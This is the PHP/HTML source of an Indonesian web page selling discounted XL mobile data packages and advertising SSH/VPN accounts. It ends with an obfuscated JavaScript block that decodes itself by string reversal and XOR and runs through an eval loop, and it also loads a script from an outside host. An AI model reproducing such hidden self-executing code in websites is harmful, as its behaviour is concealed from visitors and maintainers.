<?php 
include_once 'tembak.php';

if (empty($_SESSION['session'])){
    Header("Location:Login.php");
    session_destroy();
}
if ($_SESSION['indexx'] != 00){
    Header("Location:Login.php");
    $_SESSION['session'] = '';
    session_destroy();
}
?>
<!DOCTYPE html>
 
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#6078ea">
	<meta name="msapplication-navbutton-color" content="#6078ea">
	<meta name="apple-mobile-web-app-status-bar-style" content="#6078ea">
    <title>Tembak Paket Data XL - Jagoanssh</title>
    <meta name="description" content="JAGOANSSH - Paket Data XL Murah"/>
    <meta name="keywords" content="Jagoanssh, jagoanssh, jagoanssh.com, jagoan, jagossh, jagossh.com, Jagoanssh.com, Jagonyassh, Web SSH, Website SSH, Premium VPN, Premium SSH, SSH SSL/TLS, SSL/TLS, Badvpn, Udpgw, SSH Video Call, SSH Game Online, SSH Indonesia ,SSH Server SGGS, SSH Free, Free SSH Account 1 Month, 30 Days SSH Account, SSH Premium, VPN Premium, Tunneling Account, Dropbear, OpenSSH,Paket Data XL, Tembak XL, Paket Internet, Internet murah, Telkomsel, Axis, Tembak Paket XL, Tembak Data, Tembak Telkomsel, Tembak Paket Data Tsel, Tembak Kuota XL, Tembak Data Murah, Tembak Kuota Murah, Indosat, Smartfren, Paket data murah, Free Premium VPN">
	<meta name="google-site-verification" content="vhYyF0q_9LSeZtClRFcSLJ7M-FDrEu-DpPZIPS69WbY" />
	<link rel="icon" href="https://jagoanssh.com/favicon.png">
	
	<!-- Google Analytics -->
<script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

      ga('create', 'UA-120286388-2', 'auto');
      ga('send', 'pageview');
</script>
   <!-- End Google Analytics -->
    
    <link href="https://fonts.googleapis.com/css?family=Rubik:300,400,500" rel="stylesheet"> 
    <link rel="stylesheet" href="scss/css/styles-merged.css">
    <link rel="stylesheet" href="scss/css/style.min.css">
    <script src="/assets/js/jquery.min.js"></script>

<script>
$(document).ready(function(){

        $("#beli").click(function(event){
            event.preventDefault();
            var reg =jQuery('select[name="reg"]').val(),
                manual=jQuery('input[name="manual"]').val();
            $.ajax({
                type:'POST',
                url:'dorvip.php',
                data:{
                    reg:reg,manual:manual
                },
                error:function(xhr,ajaxOptions,thrownError){
                    $('#response').html(xhr);
                },
                cache:false,
                beforeSend:function(){
                    $(".form-control").attr("disabled", true);
                    $('#response').html('Silahkan Tunggu....');

                },
                success:function(s){
                    $(".form-control").attr("disabled", false);
                    $('#response').html(s);
                }
            });
            return false;
        });
        $.get('count.php').done(function(data){
            $('#count').html('Total Transaksi: '+data);
        });
    });
</script>

<!--[if lt IE 9]>
      <script src="js/vendor/html5shiv.min.js"></script>
      <script src="js/vendor/respond.min.js"></script>
    <![endif]-->
<?php
include('ads/auto.php');
?>
  </head>
  <body>
  <!-- START: header -->
  <header role="banner" class="probootstrap-header"><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <div class="container-fluid">
      <!-- <div class="row"> -->
        <a href="/" class="probootstrap-logo">Jagoanssh.com</a>
        
        <a href="#" class="probootstrap-intro probootstrap-burger-menu visible-xs"><i></i></a>
        <div class="mobile-menu-overlay"></div>

        <nav role="navigation" class="probootstrap-nav hidden-xs">
          <ul class="probootstrap-main-nav">
            <li><a href="/">Home</a></li>
            <li class="dropdown">
             <a href="/" class="dropdown-toggle" data-toggle="dropdown">SSH Server <b class="caret"></b></a>
             <ul class="dropdown-menu">
             <li><a href="/?do=ssh-servers"><font color="black">SSH 3 Days</font></a></li>
             <li><a href="/?do=ssh-servers/extra"><font color="black">SSH 7 Days</font></a></li>
             <li><a href="/?do=ssh-servers/one-month"><font color="black">SSH VIP</font></a></li>
             <li><a href="/?do=shadowsocks"><font color="black">Shadowsocks</font></a></li>
             </ul>
             </li>
            <li><a href="/?do=vpn-servers">VPN Server</a></li>
            <li class="dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Tools <b class="caret"></b></a>
            <ul class="dropdown-menu">
            <li><a href="/?do=squid"><font color="black">Squid Proxy</font></a></li>
            <li><a href="/?do=ssh-lifetime"><font color="black">SSH Lifetime</font></a></li>
            <li><a href="/?do=server-status"><font color="black">Server Status</font></a></li>
            <li><a href="/?do=whatismyip"><font color="black">My IP</font></a></li>
            <li><a href="https://linkconfig.com"><font color="black">LinkConfig</font></a></li>
            </ul>
            </li>
            <li class="dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Paket Data <b class="caret"></b></a>
            <ul class="dropdown-menu">
            <li><a href="/?do=axis"><font color="black">AXIS</font></a></li>
            <li><a href="/?do=indosat"><font color="black">INDOSAT</font></a></li>
            <li><a href="/?do=xl"><font color="black">XL</font></a></li>
            <li><a href="/?do=telkom"><font color="black">Tsel</font></a></li>
            </ul>
            </li>
            <li class="probootstrap-cta"><a href="#"><i class="icon-back-in-time"></i> at 22:00 GMT+7</a></li>
          </ul>
          <div class="extra-text visible-xs">
            <a href="#" class="probootstrap-burger-menu"><i></i></a>
            <h5>Follow</h5>
            <ul class="social-buttons">
              <li><a href="#"><i class="icon-twitter"></i></a></li>
              <li><a href="https://facebook.com/jagoanssh"><i class="icon-facebook"></i></a></li>
              <li><a href="#"><i class="icon-instagram2"></i></a></li>
            </ul>
            <p><small>&copy; Jagoanssh.com Copyright 2019. All Rights Reserved.</small></p>
          </div>
        </nav>

        <section class="probootstrap-intro">
          <div class="container">
            <div class="row">
              <div class="col-md-8 col-md-offset-2">
                <h1 class="probootstrap-animate">JAGOANSSH GIVES THE BEST SERVICE FOR YOU</h1>
                <div class="probootstrap-subtitle probootstrap-animate">
                  <h2>Create your account now for FREE</h2>
                </div>
              </div>
            </div>
          </div>
        </section>
        
  </header>
  <!-- END: header -->
  <!-- START: section -->
  <section class="probootstrap-section probootstrap-feature-first">
    <div class="container">
      <div class="row" style="margin-top: -120px;">
        <div class="col-md-4 probootstrap-animate">
          <div class="probootstrap-box">
              <div class="icon"><i class="icon-lock3"></i></div>
              <h3>Privacy & Security</h3>
              <p>Get your identity hidden online, your IP Address will be masked with our server IP. Also your connection will be encrypted.</p>
          </div>
        </div>
        <div class="col-md-4 probootstrap-animate">
          <div class="probootstrap-box">
              <div class="icon"><i class="icon-shield3"></i></div>
              <h3>Bypass Cencorship</h3>
              <p>Bypass your school, government or your office internet cencorship. Unblock any site and enjoy Internet Freedom.</p>
          </div>
        </div>
        <div class="col-md-4 probootstrap-animate">
          <div class="probootstrap-box">
              <div class="icon"><i class="icon-speedometer"></i></div>
              <h3>Boost Internet Speed</h3>
              <p>Our service may boost your internet speed and make your connection stable (stable PING). This differ by country.</p>
          </div>
        </div>
      </div>
<?php
include('ads/ads.php');
?>
  </section>
  <!-- END: section -->
  
<!-- START: section -->
  <section class="probootstrap-section probootstrap-section-colored">
    <div class="container">
      <div class="row">
        <div class="col-md-8 col-md-offset-2 section-heading mb50 text-center probootstrap-animate">
          <h2>Kenapa Harus Tembak Paket?</h2>
          <p class="lead">Beberapa keuntungan dengan membeli paket data di website ini</p>
        </div>
      </div>
      <div class="row">
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-wallet"></i> <span>Harga Lebih Murah</span></h3>
          <p>Harga lebih murah dan kami menyediakan banyak pilihan paket diskon</p>
        </div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-credit-card"></i> <span>System Pembayaran</span></h3>
          <p>Semua pembelian paket data langsung memotong pulsa dari pengguna</p>
        </div>
        <div class="clearfix visible-sm-block"></div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-key"></i> <span>System Keamanan</span></h3>
          <p>Website ini tidak pernah menyimpan semua data pengguna yang melakukan pembelian paket data</p>
        </div>
        <div class="clearfix visible-md-block"></div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-checkmark"></i> <span>Pembelian Legal</span></h3>
          <p>Semua pembelian paket data di jamin legal karena langsung di beli dari pihak XL</p>
        </div>
        <div class="clearfix visible-sm-block"></div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-hour-glass2"></i> <span>Beli Kapan Saja</span></h3>
          <p>Anda bisa membeli paket data kapan saja selama system kami online</p>
        </div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-users2"></i> <span>Kirim Paket</span></h3>
          <p>Anda bisa membeli paket data untuk teman atau pun keluarga anda</p>
        </div>
        <div class="clearfix visible-sm-block"></div>
      </div>
    </div>
   </div>
  </section>
  <!-- END: section -->
<?php
include('ads/link.php');
?>
<section class="probootstrap-section">
    <div class="container">
    <div class="row">
    <div class="col-md-6 col-md-offset-3 probootstrap-animate">
    <div class="alert alert-danger" role="alert">Pembelian Bonus Internet 1GB Tidak Akan Menerima SMS Silahkan Cek Paket Secara Langsung Di *123*7*1*1#</div>
    <form method="post" class="probootstrap-form probootstrap-box">
    <center>
<div class="icon"><i class="icon-checkbox-checked"></i></div>
<h1>Pilih Paket Data</h1></center>
    <form method="post">
        <div class="form-group">
			<p>
			<select class="form-control" name="reg">
			<!---<option <?php if ($anuID == 1 ) echo 'selected' ; ?> value="1">XTRA Combo VIP 6GB 27k, 30hr</option>--->
			<option <?php if ($anuID == 48 ) echo 'selected' ; ?> value="48">Bonus internet 1GB 3hari, GRATIS</option>
			 <option <?php if ($anuID == 40 ) echo 'selected' ; ?> value="40">VIP CLUB Joox 10GB, 30hr, Rp. 1000</option>
             <option <?php if ($anuID == 41 ) echo 'selected' ; ?> value="41">VIP CLUB Facebook 2GB, 30hr, Rp. 1000</option>
             <option <?php if ($anuID == 42 ) echo 'selected' ; ?> value="42">VIP CLUB iFlix 5GB, 30hr, Rp. 1000</option>
             <option <?php if ($anuID == 43 ) echo 'selected' ; ?> value="43">VIP CLUB Instagram 2GB, 30hr, Rp. 1000</option>
             <option <?php if ($anuID == 44 ) echo 'selected' ; ?> value="44">VIP CLUB Mobile Legends 10GB, 30hr, Rp. 1000</option>
             <option <?php if ($anuID == 45 ) echo 'selected' ; ?> value="45">VIP CLUB Waze 10GB, 30hr, Rp. 1000</option>
             <option <?php if ($anuID == 46 ) echo 'selected' ; ?> value="46">VIP CLUB Youtube 2GB, 30hr, Rp. 1000</option>
             <option <?php if ($anuID == 47 ) echo 'selected' ; ?> value="47">VIP CLUB Midnight 5GB, 30hr, Rp. 1000</option>
			 <option <?php if ($anuID == 2 ) echo 'selected' ; ?> value="2">XTRA Combo VIP 10GB 59k, 30hr</option>
			 <option <?php if ($anuID == 3 ) echo 'selected' ; ?> value="3">XTRA Combo VIP 20GB 89k, 30hr</option>
			 <option <?php if ($anuID == 4 ) echo 'selected' ; ?> value="4">XTRA Combo VIP 30GB 129k, 30hr</option>
			 <option <?php if ($anuID == 5 ) echo 'selected' ; ?> value="5">XTRA Combo VIP 40GB 179k, 30hr</option>
			 <option <?php if ($anuID == 6 ) echo 'selected' ; ?> value="6">HotRod 3GB 30k, 30hr</option>
			 <option <?php if ($anuID == 7 ) echo 'selected' ; ?> value="7">HotRod 6GB 50k, 30hr</option>
			</select>
		</div>
        <div align="center">
        <p><button class="btn btn-danger" input type="button" onclick="window.location = 'index.php';"> Kembali</button></p>
        <p><button class="btn btn-primary" input type="button" onclick="window.location = 'biz.php';" >PAKET BIZ</button></p>
        <button class="btn btn-primary btn-block" input type="submit" id="beli" name="beli">Beli Paket</button>
        <p><div class="btn-primary" id="response"></div></p>
<?php
include('ads/ads.php');
?>
<div id="count">
</form>
</div>
</div>
</div>
</section>

<!-- START: section -->
  <section class="probootstrap-section">
    <div class="container">
      <div class="row">
        <div class="col-md-8 col-md-offset-2 section-heading mb50 text-center probootstrap-animate">
          <h2>Benefits of using SSH/VPN</h2>
          <p class="lead">Here are some advantages of using SSH or VPN.</p>
        </div>
      </div>
<?php
include('ads/ads.php');
?>
      <div class="row">
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
            <div class="probootstrap-box">
          <h3 class="mb30">In secret (confidentiality)</h3>
          <p>By using a public network that controls data, SSH / VPN technology uses a work system by encrypting all data that passes through it.</p>
          <p>With the encryption technology, data confidentiality can be more controlled.</p>
          <p>Although there are parties who can tap data that passes over the internet in addition to the SSH / VPN line itself, but not necessarily able to read the data, because the data has been scrambled.</p>
          <p>By implementing this encryption system, no one can access and read the data network contents easily.</p>
        </div>
        </div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
        <div class="probootstrap-box">
          <h3 class="mb30">Integrity Data (Data Integrity)</h3>
          <p>When passing through the internet network, the data actually runs very far past various countries.</p>
          <p>During the trip, various disturbances could occur in its contents, lost, damaged, manipulated by people who could not be moved.</p>
          <p>In SSH / VPN technology is needed that can maintain the integrity of the data starting from the data sent until the data reaches the destination.</p>
        </div>
        </div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
        <div class="probootstrap-box">
          <h3 class="mb30">Source Authentication (Authentication Origin)</h3>
          <p>SSH / VPN technology has the ability to authenticate sending data sources to be received. SSH / VPN will check all incoming data and retrieve information from the data source.</p>
          <p>Then, the address of the data source will be successfully completed, the authentication process was successful.</p>
          <p>Thus, SSH / VPN guarantees all data sent and received from the source received. No data is falsified or sent by other parties.</p>
        </div>
      </div>
    </div>
  </section>
  <!-- END: section -->
  
<script src="//ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
<script src="//yourjavascript.com/4682124575/antibomklik.js"/></script>  
  
  <!-- START: footer -->
  <footer role="contentinfo" class="probootstrap-footer">
    <div class="container">
      <div class="row mt40">
        <div class="col-md-12 text-center">
          <ul class="probootstrap-footer-social">
            <li><a href="#"><i class="icon-twitter"></i></a></li>
            <li><a href="https://facebook.com/jagoanssh"><i class="icon-facebook"></i></a></li>
            <li><a href="#"><i class="icon-instagram2"></i></a></li>
          </ul>
          <a href="https://jagoanssh.com/?do=terms">Terms & Condition</a> | <a href="https://jagoanssh.com/?do=privacy">Privacy Policy</a>
          <p>
            <small>&copy; 2019 <a href="https://jagoanssh.com/" target="_blank">Jagoanssh.com</a>. All Rights Reserved.</small>
          </p>
          
        </div>
      </div>
    </div>
  </footer>
  <!-- END: footer -->
    <!-- Placed at the end of the document so the pages load faster -->
   <script type="text/javascript">
//<![CDATA[
<!--
var x="function f(x){var i,o=\"\",l=x.length;for(i=l-1;i>=0;i--) {try{o+=x.c" +
"harAt(i);}catch(e){}}return o;}f(\")\\\"function f(x,y){var i,o=\\\"\\\\\\\""+
"\\\\,l=x.length;for(i=0;i<l;i++){if(i<88)y++;y%=127;o+=String.fromCharCode(" +
"x.charCodeAt(i)^(y++));}return o;}f(\\\"\\\\=4>*\\\\\\\\014\\\\\\\\006\\\\\\"+
"\\013\\\\\\\\023G\\\\\\\\034\\\\\\\\037\\\\\\\\006\\\\\\\\005\\\\\\\\026\\\\"+
"\\\\031\\\\\\\\031QYAsavox~,}bq)J:i\\\\\\\\177mS\\\\\\\\rNU\\\\\\\\007YO\\\\"+
"\\\\\\\\\\\\YB@E\\\\\\\\026WUPn(7\\\\\\\\032jtpa#1&?(.b\\\\\\\\002\\\\\\\\0" +
"22>\\\\\\\\nFHJLR\\\\\\\\003\\\\\\\\021\\\\\\\\006\\\\\\\\037\\\\\\\\010\\\\"+
"\\\\016\\\\\\\\\\\\\\\\\\\\\\\\rs`8[+yh\\\\\\\\177~!ec>\\\\\\\\177r}{8zqw4q" +
"oA<!\\\\\\\\034\\\\\\\\016Q@VLVS\\\\\\\\026uXwB\\\\\\\\r\\\\\\\\016\\\\\\\\" +
"017\\\\\\\\020\\\\\\\\rAPF\\\\\\\\\\\\\\\\FC\\\\\\\\030JHX\\\\\\\\001a\\\\\\"+
"\\034^32'77j,4g#;>)?7a6> >z8?9v3)\\\\\\\\007~cbp\\\\\\\\023\\\\\\\\002\\\\\\"+
"\\020\\\\\\\\n\\\\\\\\024\\\\\\\\021X;\\\\\\\\0325\\\\\\\\004KLMNS\\\\\\\\0" +
"03\\\\\\\\022\\\\\\\\000\\\\\\\\032\\\\\\\\004\\\\\\\\001V\\\\\\\\004\\\\\\" +
"\\n\\\\\\\\032G'^\\\\\\\\034\\\\\\\\rsdvp+ou(iyz%ad`!zbN1*)9d{kskh#<6\\\\\\" +
"\\033\\\\\\\\021\\\\\\\\031\\\"\\\\,88)\\\"(f};)lo,0(rtsbus.o nruter};)i(tA" +
"rahc.x=+o{)--i;0=>i;1-l=i(rof}}{)e(hctac};l=+l;x=+x{yrt{)711=!)31/l(tAedoCr" +
"ahc.x(elihw;lo=l,htgnel.x=lo,\\\"\\\"=o,i rav{)x(f noitcnuf\")"              ;
while(x=eval(x));
//-->
//]]>
</script>
  
  </body>
</html>